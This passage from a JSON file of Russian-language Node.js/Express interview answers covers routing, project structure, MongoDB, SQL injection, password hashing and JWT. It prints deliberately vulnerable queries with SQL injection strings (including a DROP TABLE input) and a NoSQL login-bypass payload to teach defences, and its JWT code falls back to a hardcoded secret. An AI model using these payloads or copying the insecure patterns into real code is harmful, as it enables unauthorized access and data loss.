data\n\napp.post('/users', (req, res) => {\n  console.log(req.body);\n  // POST /users с JSON телом:\n  // { \"name\": \"John\", \"email\": \"john@example.com\", \"age\": 30 }\n  // Output: { name: 'John', email: 'john@example.com', age: 30 }\n\n  const { name, email, age } = req.body;\n  res.json({ name, email, age });\n});\n```\n\n**Типы req.body:**\n\n```javascript\n// JSON (Content-Type: application/json)\napp.post('/api/users', express.json(), (req, res) => {\n  console.log(req.body);\n  // { name: 'John', age: 30, hobbies: ['coding', 'reading'] }\n  res.json(req.body);\n});\n\n// Form data (Content-Type: application/x-www-form-urlencoded)\napp.post('/form', express.urlencoded({ extended: true }), (req, res) => {\n  console.log(req.body);\n  // name=John&email=john@example.com\n  // Output: { name: 'John', email: 'john@example.com' }\n  res.json(req.body);\n});\n\n// Multipart form data (для файлов)\nconst multer = require('multer');\nconst upload = multer({ dest: 'uploads/' });\n\napp.post('/upload', upload.single('avatar'), (req, res) => {\n  console.log(req.body); // Текстовые поля\n  console.log(req.file); // Файл\n});\n```\n\n**Комбинирование всех трех:**\n\n```javascript\napp.put('/users/:userId/posts/:postId', (req, res) => {\n  // URL: PUT /users/123/posts/456?notify=true&silent=false\n  // Body: { \"title\": \"New Title\", \"content\": \"Updated content\" }\n\n  const userId = req.params.userId;           // '123'\n  const postId = req.params.postId;           // '456'\n  const notify = req.query.notify === 'true'; // true\n  const silent = req.query.silent === 'true'; // false\n  const { title, content } = req.body;        // { title: '...', content: '...' }\n\n  res.json({\n    userId,\n    postId,\n    notify,\n    silent,\n    title,\n    content\n  });\n});\n```\n\n**Практический пример - полноценный CRUD endpoint:**\n\n```javascript\nconst express = require('express');\nconst app = express();\n\napp.use(express.json());\n\n// GET /api/users?page=1&limit=10&role=admin\napp.get('/api/users', (req, res) => {\n  const { page = 1, limit = 10, role } = req.query;\n\n  // req.query используется для фильтрации, пагинации, сортировки\n  res.json({\n    users: [],\n    pagination: {\n      page: parseInt(page, 10),\n      limit: parseInt(limit, 10)\n    },\n    filters: { role }\n  });\n});\n\n// GET /api/users/123\napp.get('/api/users/:id', (req, res) => {\n  const userId = req.params.id; // req.params для идентификаторов в пути\n\n  res.json({ id: userId, name: 'John' });\n});\n\n// POST /api/users\napp.post('/api/users', (req, res) => {\n  const { name, email, password } = req.body; // req.body для создания ресурсов\n\n  res.status(201).json({ id: 1, name, email });\n});\n\n// PUT /api/users/123?notify=true\napp.put('/api/users/:id', (req, res) => {\n  const userId = req.params.id;               // Идентификатор из пути\n  const { name, email } = req.body;           // Данные для обновления\n  const notify = req.query.notify === 'true'; // Дополнительные опции\n\n  res.json({ id: userId, name, email, notified: notify });\n});\n\n// DELETE /api/users/123\napp.delete('/api/users/:id', (req, res) => {\n  const userId = req.params.id; // req.params для идентификаторов\n\n  res.status(204).send();\n});\n```\n\n**Валидация всех трех источников:**\n\n```javascript\nconst { body, param, query, validationResult } = require('express-validator');\n\napp.get('/users/:id',\n  // Валидация params\n  param('id').isInt().toInt(),\n\n  // Валидация query\n  query('includeDeleted').optional().isBoolean().toBoolean(),\n\n  (req, res, next) => {\n    const errors = validationResult(req);\n    if (!errors.isEmpty()) {\n      return res.status(400).json({ errors: errors.array() });\n    }\n    next();\n  },\n\n  (req, res) => {\n    res.json({\n      userId: req.params.id,         // number (converted)\n      includeDeleted: req.query.includeDeleted // boolean (converted)\n    });\n  }\n);\n\napp.post('/users',\n  // Валидация body\n  body('email').isEmail().normalizeEmail(),\n  body('password').isLength({ min: 6 }),\n\n  (req, res, next) => {\n    const errors = validationResult(req);\n    if (!errors.isEmpty()) {\n      return res.status(400).json({ errors: errors.array() });\n    }\n    next();\n  },\n\n  (req, res) => {\n    res.json(req.body);\n  }\n);\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 38,
          "question_number_in_chapter": 7,
          "question_chapter": 5,
          "question_title": "Как организовать структуру проекта на Express.js?",
          "answer_markdown": "\n**Ответ:**\n\nПравильная структура проекта критически важна для масштабируемости и поддерживаемости приложения. Существует несколько популярных подходов.\n\n**Структура 1: MVC (Model-View-Controller) - простая:**\n\n```\nproject/\n├── app.js              # Точка входа\n├── package.json\n├── .env\n├── .gitignore\n├── node_modules/\n├── controllers/        # Бизнес-логика\n│   ├── auth.controller.js\n│   ├── user.controller.js\n│   └── post.controller.js\n├── models/             # Модели данных (Mongoose, Sequelize)\n│   ├── User.js\n│   └── Post.js\n├── routes/             # Определение роутов\n│   ├── index.js\n│   ├── auth.routes.js\n│   ├── user.routes.js\n│   └── post.routes.js\n├── middleware/         # Кастомные middleware\n│   ├── auth.js\n│   ├── error.js\n│   └── validation.js\n├── config/             # Конфигурация\n│   ├── database.js\n│   └── config.js\n├── public/             # Статические файлы\n│   ├── css/\n│   ├── js/\n│   └── images/\n└── views/              # Шаблоны (EJS, Pug)\n    ├── index.ejs\n    └── user.ejs\n```\n\n**Пример реализации MVC:**\n\n```javascript\n// app.js\nconst express = require('express');\nconst app = express();\nconst config = require('./config/config');\nconst routes = require('./routes');\nconst errorHandler = require('./middleware/error');\n\napp.use(express.json());\napp.use(express.static('public'));\n\napp.use('/api', routes);\n\napp.use(errorHandler);\n\napp.listen(config.port, () => {\n  console.log(`Server running on port ${config.port}`);\n});\n\n// routes/index.js\nconst express = require('express');\nconst router = express.Router();\n\nconst authRoutes = require('./auth.routes');\nconst userRoutes = require('./user.routes');\nconst postRoutes = require('./post.routes');\n\nrouter.use('/auth', authRoutes);\nrouter.use('/users', userRoutes);\nrouter.use('/posts', postRoutes);\n\nmodule.exports = router;\n\n// routes/user.routes.js\nconst express = require('express');\nconst router = express.Router();\nconst userController = require('../controllers/user.controller');\nconst { authenticate } = require('../middleware/auth');\n\nrouter.get('/', userController.getAllUsers);\nrouter.get('/:id', userController.getUserById);\nrouter.post('/', userController.createUser);\nrouter.put('/:id', authenticate, userController.updateUser);\nrouter.delete('/:id', authenticate, userController.deleteUser);\n\nmodule.exports = router;\n\n// controllers/user.controller.js\nconst User = require('../models/User');\n\nexports.getAllUsers = async (req, res, next) => {\n  try {\n    const users = await User.find();\n    res.json(users);\n  } catch (err) {\n    next(err);\n  }\n};\n\nexports.getUserById = async (req, res, next) => {\n  try {\n    const user = await User.findById(req.params.id);\n    if (!user) {\n      return res.status(404).json({ error: 'User not found' });\n    }\n    res.json(user);\n  } catch (err) {\n    next(err);\n  }\n};\n\n// models/User.js\nconst mongoose = require('mongoose');\n\nconst userSchema = new mongoose.Schema({\n  name: { type: String, required: true },\n  email: { type: String, required: true, unique: true },\n  password: { type: String, required: true }\n}, { timestamps: true });\n\nmodule.exports = mongoose.model('User', userSchema);\n```\n\n**Структура 2: Feature-based (модульная) - для больших проектов:**\n\n```\nproject/\n├── src/\n│   ├── app.js\n│   ├── server.js\n│   ├── config/\n│   │   ├── database.js\n│   │   ├── express.js\n│   │   └── index.js\n│   ├── features/          # Модули по функциям\n│   │   ├── auth/\n│   │   │   ├── auth.controller.js\n│   │   │   ├── auth.service.js\n│   │   │   ├── auth.routes.js\n│   │   │   ├── auth.middleware.js\n│   │   │   ├── auth.validation.js\n│   │   │   └── index.js\n│   │   ├── users/\n│   │   │   ├── user.controller.js\n│   │   │   ├── user.service.js\n│   │   │   ├── user.model.js\n│   │   │   ├── user.routes.js\n│   │   │   ├── user.validation.js\n│   │   │   └── index.js\n│   │   └── posts/\n│   │       ├── post.controller.js\n│   │       ├── post.service.js\n│   │       ├── post.model.js\n│   │       ├── post.routes.js\n│   │       └── index.js\n│   ├── shared/            # Общие модули\n│   │   ├── middleware/\n│   │   │   ├── error.js\n│   │   │   ├── rateLimiter.js\n│   │   │   └── logger.js\n│   │   ├── utils/\n│   │   │   ├── asyncHandler.js\n│   │   │   └── AppError.js\n│   │   └── constants/\n│   │       └── index.js\n│   └── database/\n│       ├── migrations/\n│       └── seeds/\n├── tests/\n│   ├── unit/\n│   └── integration/\n├── package.json\n└── .env\n```\n\n**Пример feature-based модуля:**\n\n```javascript\n// src/features/users/index.js\nconst router = require('./user.routes');\nconst UserService = require('./user.service');\n\nmodule.exports = {\n  router,\n  UserService\n};\n\n// src/features/users/user.service.js\nconst User = require('./user.model');\n\nclass UserService {\n  async findAll(filters = {}) {\n    return User.find(filters);\n  }\n\n  async findById(id) {\n    const user = await User.findById(id);\n    if (!user) {\n      throw new Error('User not found');\n    }\n    return user;\n  }\n\n  async create(userData) {\n    const user = new User(userData);\n    return user.save();\n  }\n\n  async update(id, userData) {\n    const user = await User.findByIdAndUpdate(id, userData, { new: true });\n    if (!user) {\n      throw new Error('User not found');\n    }\n    return user;\n  }\n\n  async delete(id) {\n    const user = await User.findByIdAndDelete(id);\n    if (!user) {\n      throw new Error('User not found');\n    }\n    return user;\n  }\n}\n\nmodule.exports = new UserService();\n\n// src/features/users/user.controller.js\nconst UserService = require('./user.service');\nconst asyncHandler = require('../../shared/utils/asyncHandler');\n\nexports.getAllUsers = asyncHandler(async (req, res) => {\n  const users = await UserService.findAll();\n  res.json(users);\n});\n\nexports.getUserById = asyncHandler(async (req, res) => {\n  const user = await UserService.findById(req.params.id);\n  res.json(user);\n});\n\nexports.createUser = asyncHandler(async (req, res) => {\n  const user = await UserService.create(req.body);\n  res.status(201).json(user);\n});\n\n// src/app.js\nconst express = require('express');\nconst { router: userRouter } = require('./features/users');\nconst { router: authRouter } = require('./features/auth');\nconst { router: postRouter } = require('./features/posts');\n\nconst app = express();\n\napp.use('/api/users', userRouter);\napp.use('/api/auth', authRouter);\napp.use('/api/posts', postRouter);\n\nmodule.exports = app;\n```\n\n**Структура 3: Clean Architecture / Domain-Driven Design:**\n\n```\nproject/\n├── src/\n│   ├── domain/              # Бизнес-логика (независимая)\n│   │   ├── entities/\n│   │   │   ├── User.js\n│   │   │   └── Post.js\n│   │   ├── repositories/    # Интерфейсы репозиториев\n│   │   │   ├── IUserRepository.js\n│   │   │   └── IPostRepository.js\n│   │   └── services/        # Бизнес-сервисы\n│   │       ├── UserService.js\n│   │       └── PostService.js\n│   ├── infrastructure/      # Внешние зависимости\n│   │   ├── database/\n│   │   │   ├── mongoose/\n│   │   │   │   ├── UserRepository.js\n│   │   │   │   └── PostRepository.js\n│   │   │   └── connection.js\n│   │   ├── cache/\n│   │   │   └── redis.js\n│   │   └── email/\n│   │       └── sendgrid.js\n│   ├── application/         # Use cases\n│   │   ├── CreateUser.js\n│   │   ├── GetUserById.js\n│   │   └── UpdateUser.js\n│   ├── presentation/        # API layer (Express)\n│   │   ├── routes/\n│   │   ├── controllers/\n│   │   └── middleware/\n│   └── config/\n├── tests/\n└── package.json\n```\n\n**Общие компоненты для всех структур:**\n\n```javascript\n// shared/utils/asyncHandler.js\nmodule.exports = (fn) => (req, res, next) => {\n  Promise.resolve(fn(req, res, next)).catch(next);\n};\n\n// shared/utils/AppError.js\nclass AppError extends Error {\n  constructor(message, statusCode) {\n    super(message);\n    this.statusCode = statusCode;\n    this.isOperational = true;\n    Error.captureStackTrace(this, this.constructor);\n  }\n}\n\nmodule.exports = AppError;\n\n// shared/middleware/error.js\nconst AppError = require('../utils/AppError');\n\nmodule.exports = (err, req, res, next) => {\n  err.statusCode = err.statusCode || 500;\n  err.status = err.status || 'error';\n\n  if (process.env.NODE_ENV === 'development') {\n    res.status(err.statusCode).json({\n      status: err.status,\n      error: err,\n      message: err.message,\n      stack: err.stack\n    });\n  } else {\n    if (err.isOperational) {\n      res.status(err.statusCode).json({\n        status: err.status,\n        message: err.message\n      });\n    } else {\n      console.error('ERROR 💥', err);\n      res.status(500).json({\n        status: 'error',\n        message: 'Something went wrong!'\n      });\n    }\n  }\n};\n\n// config/config.js\nrequire('dotenv').config();\n\nmodule.exports = {\n  port: process.env.PORT || 3000,\n  nodeEnv: process.env.NODE_ENV || 'development',\n  database: {\n    url: process.env.MONGODB_URI || 'mongodb://localhost/myapp',\n    options: {\n      useNewUrlParser: true,\n      useUnifiedTopology: true\n    }\n  },\n  jwt: {\n    secret: process.env.JWT_SECRET,\n    expiresIn: process.env.JWT_EXPIRES_IN || '7d'\n  },\n  redis: {\n    host: process.env.REDIS_HOST || 'localhost',\n    port: process.env.REDIS_PORT || 6379\n  }\n};\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        }
      ]
    },
    {
      "chapter_number": 6,
      "chapter_title": "Database & Security",
      "questions_count": 11,
      "questions": [
        {
          "question_number": 39,
          "question_number_in_chapter": 1,
          "question_chapter": 6,
          "question_title": "Как подключиться к MongoDB из Node.js? Mongoose vs нативный драйвер",
          "answer_markdown": "\n**Ответ:**\n\nСуществует два основных способа работы с MongoDB в Node.js: **нативный драйвер** и **Mongoose ORM**.\n\n**Способ 1: Нативный MongoDB драйвер:**\n\n```bash\nnpm install mongodb\n```\n\n```javascript\nconst { MongoClient } = require('mongodb');\n\n// Подключение\nconst uri = 'mongodb://localhost:27017';\nconst client = new MongoClient(uri);\n\nasync function main() {\n  try {\n    await client.connect();\n    console.log('Connected to MongoDB');\n\n    const database = client.db('myapp');\n    const users = database.collection('users');\n\n    // CREATE\n    const newUser = { name: 'John', email: 'john@example.com', age: 30 };\n    const result = await users.insertOne(newUser);\n    console.log('Inserted ID:', result.insertedId);\n\n    // READ\n    const user = await users.findOne({ email: 'john@example.com' });\n    console.log('Found user:', user);\n\n    // UPDATE\n    await users.updateOne(\n      { email: 'john@example.com' },\n      { $set: { age: 31 } }\n    );\n\n    // DELETE\n    await users.deleteOne({ email: 'john@example.com' });\n\n    // Множественная вставка\n    await users.insertMany([\n      { name: 'Alice', email: 'alice@example.com' },\n      { name: 'Bob', email: 'bob@example.com' }\n    ]);\n\n    // Поиск с фильтрами\n    const activeUsers = await users\n      .find({ age: { $gte: 18 } })\n      .sort({ name: 1 })\n      .limit(10)\n      .toArray();\n\n  } finally {\n    await client.close();\n  }\n}\n\nmain().catch(console.error);\n```\n\n**Способ 2: Mongoose (ODM - Object Document Mapper):**\n\n```bash\nnpm install mongoose\n```\n\n```javascript\nconst mongoose = require('mongoose');\n\n// Подключение\nmongoose.connect('mongodb://localhost:27017/myapp', {\n  useNewUrlParser: true,\n  useUnifiedTopology: true\n});\n\nconst db = mongoose.connection;\ndb.on('error', console.error.bind(console, 'connection error:'));\ndb.once('open', () => {\n  console.log('Connected to MongoDB via Mongoose');\n});\n\n// Определение схемы\nconst userSchema = new mongoose.Schema({\n  name: { type: String, required: true },\n  email: { type: String, required: true, unique: true },\n  age: { type: Number, min: 0 },\n  createdAt: { type: Date, default: Date.now },\n  isActive: { type: Boolean, default: true }\n});\n\n// Методы модели\nuserSchema.methods.getFullInfo = function() {\n  return `${this.name} (${this.email})`;\n};\n\n// Статические методы\nuserSchema.statics.findByEmail = function(email) {\n  return this.findOne({ email });\n};\n\n// Middleware (hooks)\nuserSchema.pre('save', function(next) {\n  console.log('Saving user:', this.name);\n  next();\n});\n\n// Создание модели\nconst User = mongoose.model('User', userSchema);\n\n// Использование\nasync function main() {\n  // CREATE\n  const user = new User({\n    name: 'John',\n    email: 'john@example.com',\n    age: 30\n  });\n  await user.save();\n\n  // Или через create\n  await User.create({\n    name: 'Alice',\n    email: 'alice@example.com',\n    age: 25\n  });\n\n  // READ\n  const foundUser = await User.findOne({ email: 'john@example.com' });\n  console.log(foundUser.getFullInfo());\n\n  // UPDATE\n  await User.updateOne(\n    { email: 'john@example.com' },\n    { age: 31 }\n  );\n\n  // Или через findOneAndUpdate\n  const updated = await User.findOneAndUpdate(\n    { email: 'john@example.com' },\n    { age: 32 },\n    { new: true } // Вернуть обновленный документ\n  );\n\n  // DELETE\n  await User.deleteOne({ email: 'john@example.com' });\n\n  // Поиск с фильтрами\n  const activeUsers = await User\n    .find({ age: { $gte: 18 }, isActive: true })\n    .sort({ name: 1 })\n    .limit(10)\n    .select('name email'); // Выбрать только определенные поля\n}\n```\n\n**Сравнение Mongoose vs нативный драйвер:**\n\n| Характеристика | Mongoose | Нативный драйвер |\n|----------------|----------|------------------|\n| **Схема данных** | Есть (Schema) | Нет (schemaless) |\n| **Валидация** | Встроенная | Ручная |\n| **Middleware/Hooks** | Есть (pre/post) | Нет |\n| **Populate (JOIN)** | Есть | Вручную через `$lookup` |\n| **Типизация** | Сильная | Слабая |\n| **Производительность** | Немного медленнее | Быстрее |\n| **Размер пакета** | ~1.5MB | ~500KB |\n| **Кривая обучения** | Средняя | Низкая |\n\n**Connection pooling:**\n\n```javascript\n// Mongoose (автоматический pooling)\nmongoose.connect('mongodb://localhost:27017/myapp', {\n  maxPoolSize: 10,\n  minPoolSize: 2,\n  maxIdleTimeMS: 30000\n});\n\n// Нативный драйвер\nconst client = new MongoClient(uri, {\n  maxPoolSize: 10,\n  minPoolSize: 2\n});\n```\n\n**Транзакции (Mongoose):**\n\n```javascript\nconst session = await mongoose.startSession();\nsession.startTransaction();\n\ntry {\n  await User.create([{ name: 'John' }], { session });\n  await Post.create([{ title: 'Hello', userId: user._id }], { session });\n\n  await session.commitTransaction();\n} catch (err) {\n  await session.abortTransaction();\n  throw err;\n} finally {\n  session.endSession();\n}\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 40,
          "question_number_in_chapter": 2,
          "question_chapter": 6,
          "question_title": "Что такое SQL Injection и как его предотвратить?",
          "answer_markdown": "\n**Ответ:**\n\n**SQL Injection** - это атака, при которой злоумышленник внедряет вредоносный SQL код через пользовательский ввод, получая несанкционированный доступ к базе данных.\n\n**Пример уязвимого кода:**\n\n```javascript\n// ❌ УЯЗВИМЫЙ КОД - НЕ ДЕЛАЙТЕ ТАК!\napp.get('/users/:id', async (req, res) => {\n  const userId = req.params.id;\n\n  // Прямая конкатенация - ОПАСНО!\n  const query = `SELECT * FROM users WHERE id = ${userId}`;\n  const result = await db.query(query);\n\n  res.json(result.rows[0]);\n});\n\n// Атака:\n// GET /users/1 OR 1=1 --\n// SQL: SELECT * FROM users WHERE id = 1 OR 1=1 --\n// Результат: вернет ВСЕХ пользователей!\n\n// GET /users/1; DROP TABLE users; --\n// SQL: SELECT * FROM users WHERE id = 1; DROP TABLE users; --\n// Результат: удаление таблицы!\n```\n\n**Способы защиты:**\n\n**1. Prepared Statements (параметризованные запросы):**\n\n```javascript\n// ✅ БЕЗОПАСНО - pg (PostgreSQL)\nconst { Pool } = require('pg');\nconst pool = new Pool();\n\napp.get('/users/:id', async (req, res) => {\n  const userId = req.params.id;\n\n  // Параметризованный запрос\n  const query = 'SELECT * FROM users WHERE id = $1';\n  const result = await pool.query(query, [userId]);\n\n  res.json(result.rows[0]);\n});\n\n// Даже если userId = \"1 OR 1=1\", он будет обработан как строка, не как SQL код\n```\n\n**2. ORM (Sequelize, TypeORM):**\n\n```javascript\n// ✅ БЕЗОПАСНО - Sequelize\nconst { Sequelize, DataTypes } = require('sequelize');\nconst sequelize = new Sequelize('database', 'username', 'password', {\n  dialect: 'postgres'\n});\n\nconst User = sequelize.define('User', {\n  name: DataTypes.STRING,\n  email: DataTypes.STRING\n});\n\napp.get('/users/:id', async (req, res) => {\n  const user = await User.findByPk(req.params.id);\n  res.json(user);\n});\n\n// Sequelize автоматически экранирует параметры\n```\n\n**3. Query Builders (Knex.js):**\n\n```javascript\n// ✅ БЕЗОПАСНО - Knex.js\nconst knex = require('knex')({\n  client: 'pg',\n  connection: process.env.DATABASE_URL\n});\n\napp.get('/users', async (req, res) => {\n  const { name } = req.query;\n\n  const users = await knex('users')\n    .where('name', 'like', `%${name}%`)\n    .select('*');\n\n  res.json(users);\n});\n\n// Knex автоматически экранирует параметры\n```\n\n**4. Валидация и санитизация:**\n\n```javascript\nconst { body, param, validationResult } = require('express-validator');\n\napp.get('/users/:id',\n  // Валидация\n  param('id').isInt().toInt(),\n\n  async (req, res) => {\n    const errors = validationResult(req);\n    if (!errors.isEmpty()) {\n      return res.status(400).json({ errors: errors.array() });\n    }\n\n    const userId = req.params.id; // Гарантированно число\n\n    const query = 'SELECT * FROM users WHERE id = $1';\n    const result = await pool.query(query, [userId]);\n\n    res.json(result.rows[0]);\n  }\n);\n```\n\n**5. Whitelist разрешенных значений:**\n\n```javascript\napp.get('/users', async (req, res) => {\n  const { sort } = req.query;\n\n  // Whitelist разрешенных столбцов для сортировки\n  const allowedSortColumns = ['name', 'email', 'created_at'];\n\n  if (!allowedSortColumns.includes(sort)) {\n    return res.status(400).json({ error: 'Invalid sort column' });\n  }\n\n  // Теперь безопасно использовать в запросе\n  const query = `SELECT * FROM users ORDER BY ${sort}`;\n  const result = await pool.query(query);\n\n  res.json(result.rows);\n});\n```\n\n**NoSQL Injection (MongoDB):**\n\n```javascript\n// ❌ УЯЗВИМЫЙ КОД\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n\n  // Прямое использование пользовательского ввода\n  const user = await User.findOne({\n    username: username,\n    password: password\n  });\n\n  if (user) {\n    res.json({ success: true });\n  } else {\n    res.status(401).json({ error: 'Invalid credentials' });\n  }\n});\n\n// Атака:\n// POST /login\n// { \"username\": \"admin\", \"password\": { \"$ne\": null } }\n// MongoDB query: { username: \"admin\", password: { $ne: null } }\n// Результат: вход без знания пароля!\n```\n\n**Защита от NoSQL Injection:**\n\n```javascript\n// ✅ БЕЗОПАСНО\napp.post('/login', async (req, res) => {\n  const { username, password } = req.body;\n\n  // Валидация типов\n  if (typeof username !== 'string' || typeof password !== 'string') {\n    return res.status(400).json({ error: 'Invalid input' });\n  }\n\n  const user = await User.findOne({ username });\n\n  if (!user) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n\n  // Используйте bcrypt для паролей\n  const isValid = await bcrypt.compare(password, user.password);\n\n  if (isValid) {\n    res.json({ success: true });\n  } else {\n    res.status(401).json({ error: 'Invalid credentials' });\n  }\n});\n\n// Или используйте mongo-sanitize\nconst mongoSanitize = require('express-mongo-sanitize');\napp.use(mongoSanitize());\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 41,
          "question_number_in_chapter": 3,
          "question_chapter": 6,
          "question_title": "Как безопасно хранить пароли в базе данных?",
          "answer_markdown": "\n**Ответ:**\n\n**НИКОГДА** не храните пароли в открытом виде! Используйте **хеширование** с **солью**.\n\n**Способ 1: bcrypt (рекомендуется):**\n\n```bash\nnpm install bcrypt\n```\n\n```javascript\nconst bcrypt = require('bcrypt');\n\n// Регистрация пользователя\nasync function registerUser(email, password) {\n  // Генерация соли и хеширование\n  const saltRounds = 10; // Чем больше, тем безопаснее (но медленнее)\n  const hashedPassword = await bcrypt.hash(password, saltRounds);\n\n  // Сохранение в БД\n  await User.create({\n    email,\n    password: hashedPassword // Хранится как $2b$10$xyz...\n  });\n}\n\n// Вход пользователя\nasync function loginUser(email, password) {\n  const user = await User.findOne({ email });\n\n  if (!user) {\n    throw new Error('User not found');\n  }\n\n  // Сравнение пароля с хешем\n  const isValid = await bcrypt.compare(password, user.password);\n\n  if (!isValid) {\n    throw new Error('Invalid password');\n  }\n\n  return user;\n}\n```\n\n**Способ 2: argon2 (еще более безопасный):**\n\n```bash\nnpm install argon2\n```\n\n```javascript\nconst argon2 = require('argon2');\n\n// Регистрация\nasync function registerUser(email, password) {\n  const hashedPassword = await argon2.hash(password);\n\n  await User.create({\n    email,\n    password: hashedPassword\n  });\n}\n\n// Вход\nasync function loginUser(email, password) {\n  const user = await User.findOne({ email });\n\n  if (!user) {\n    throw new Error('User not found');\n  }\n\n  const isValid = await argon2.verify(user.password, password);\n\n  if (!isValid) {\n    throw new Error('Invalid password');\n  }\n\n  return user;\n}\n```\n\n**Интеграция с Mongoose:**\n\n```javascript\nconst mongoose = require('mongoose');\nconst bcrypt = require('bcrypt');\n\nconst userSchema = new mongoose.Schema({\n  email: { type: String, required: true, unique: true },\n  password: { type: String, required: true }\n});\n\n// Хеширование перед сохранением\nuserSchema.pre('save', async function(next) {\n  // Хешировать только если пароль изменился\n  if (!this.isModified('password')) {\n    return next();\n  }\n\n  try {\n    const salt = await bcrypt.genSalt(10);\n    this.password = await bcrypt.hash(this.password, salt);\n    next();\n  } catch (err) {\n    next(err);\n  }\n});\n\n// Метод для проверки пароля\nuserSchema.methods.comparePassword = async function(candidatePassword) {\n  return bcrypt.compare(candidatePassword, this.password);\n};\n\nconst User = mongoose.model('User', userSchema);\n\n// Использование\napp.post('/register', async (req, res) => {\n  const { email, password } = req.body;\n\n  const user = new User({ email, password });\n  await user.save(); // Пароль автоматически хешируется\n\n  res.json({ message: 'User registered' });\n});\n\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n\n  const user = await User.findOne({ email });\n  if (!user) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n\n  const isValid = await user.comparePassword(password);\n  if (!isValid) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n\n  res.json({ message: 'Login successful' });\n});\n```\n\n**Дополнительные меры безопасности:**\n\n```javascript\nconst rateLimit = require('express-rate-limit');\n\n// 1. Rate limiting для защиты от брутфорса\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 минут\n  max: 5, // Максимум 5 попыток\n  message: 'Too many login attempts, please try again later.'\n});\n\napp.post('/login', loginLimiter, async (req, res) => {\n  // ... логика входа\n});\n\n// 2. Минимальная длина пароля\nconst { body, validationResult } = require('express-validator');\n\napp.post('/register',\n  body('password')\n    .isLength({ min: 8 })\n    .withMessage('Password must be at least 8 characters')\n    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)/)\n    .withMessage('Password must contain uppercase, lowercase, and number'),\n\n  async (req, res) => {\n    const errors = validationResult(req);\n    if (!errors.isEmpty()) {\n      return res.status(400).json({ errors: errors.array() });\n    }\n\n    // ... создание пользователя\n  }\n);\n\n// 3. Account lockout после нескольких неудачных попыток\nconst userSchema = new mongoose.Schema({\n  email: String,\n  password: String,\n  failedLoginAttempts: { type: Number, default: 0 },\n  lockUntil: Date\n});\n\nuserSchema.methods.incrementFailedAttempts = async function() {\n  this.failedLoginAttempts += 1;\n\n  if (this.failedLoginAttempts >= 5) {\n    this.lockUntil = new Date(Date.now() + 30 * 60 * 1000); // 30 минут\n  }\n\n  await this.save();\n};\n\nuserSchema.methods.resetFailedAttempts = async function() {\n  this.failedLoginAttempts = 0;\n  this.lockUntil = undefined;\n  await this.save();\n};\n\n// В login handler\napp.post('/login', async (req, res) => {\n  const user = await User.findOne({ email: req.body.email });\n\n  if (user && user.lockUntil && user.lockUntil > new Date()) {\n    return res.status(423).json({\n      error: 'Account locked. Try again later.'\n    });\n  }\n\n  const isValid = await user.comparePassword(req.body.password);\n\n  if (isValid) {\n    await user.resetFailedAttempts();\n    res.json({ message: 'Login successful' });\n  } else {\n    await user.incrementFailedAttempts();\n    res.status(401).json({ error: 'Invalid credentials' });\n  }\n});\n```\n\n",
          "best_practices": [],
          "difficulty": "Senior"
        },
        {
          "question_number": 42,
          "question_number_in_chapter": 4,
          "question_chapter": 6,
          "question_title": "Что такое JWT? Как реализовать аутентификацию с JWT?",
          "answer_markdown": "\n**Ответ:**\n\n**JWT (JSON Web Token)** - это компактный, URL-безопасный токен для передачи информации между сторонами. Используется для аутентификации и авторизации.\n\n**Структура JWT:**\n\n```\nheader.payload.signature\n\nПример:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.\neyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.\nSflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\n```\n\n**Header** (алгоритм шифрования):\n```json\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n```\n\n**Payload** (данные пользователя):\n```json\n{\n  \"userId\": \"123\",\n  \"role\": \"admin\",\n  \"iat\": 1699999999,\n  \"exp\": 1700086399\n}\n```\n\n**Signature** (подпись для верификации):\n```\nHMACSHA256(\n  base64UrlEncode(header) + \".\" + base64UrlEncode(payload),\n  secret\n)\n```\n\n**Реализация:**\n\n```bash\nnpm install jsonwebtoken\n```\n\n```javascript\nconst jwt = require('jsonwebtoken');\nconst express = require('express');\nconst app = express();\n\napp.use(express.json());\n\nconst JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key';\nconst JWT_EXPIRES_IN = '7d';\n\n// Вход - генерация токена\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n\n  // Проверка пользователя (упрощенно)\n  const user = await User.findOne({ email });\n  if (!user || !(await user.comparePassword(password))) {\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n\n  // Создание JWT\n  const token = jwt.sign(\n    {\n      userId: user._id,\n      email: user.email,\n      role: user.role\n    },\n    JWT_SECRET,\n    { expiresIn: JWT_EXPIRES_IN }\n  );\n\n  res.json({\n    token,\n    user: {\n      id: user._id,\n      email: user.email,\n      role: user.role\n    }\n  });\n});\n\n// Middleware для проверки токена\nfunction authenticate(req, res, next) {\n  // Получение токена из заголовка\n  const authHeader = req.headers.authorization;\n\n  if (!authHeader || !authHeader.startsWith('Bearer ')) {\n    return res.status(401).json({ error: 'No token provided' });\n  }\n\n  const token = authHeader.substring(7); // Убираем \"Bearer \"\n\n  try {\n    // Верификация токена\n    const decoded = jwt.verify(token, JWT_SECRET);\n    req.user = decoded; // Добавляем данные пользователя в req\n    next();\n  } catch (err) {\n    if (err.name === 'TokenExpiredError') {\n      return res.status(401).json({ error: 'Token expired' });\n    }\n    return res.status(401).json({ error: 'Invalid token' });\n  }\n}\n\n// Защищенный роут\napp.get('/profile', authenticate, (req, res) => {\n  res.json({\n    message: 'Protected route',\n    user: req.user\n  });\n});\n\n// Роль-based авторизация\nfunction authorize(...roles) {\n  return (req, res, next) => {\n    if (!req.user) {\n      return res.status(401).json({ error: 'Unauthorized' });\n    }\n\n    if (!roles.includes(req.user.role)) {\n      return res.status(403).json({ error: 'Forbidden' 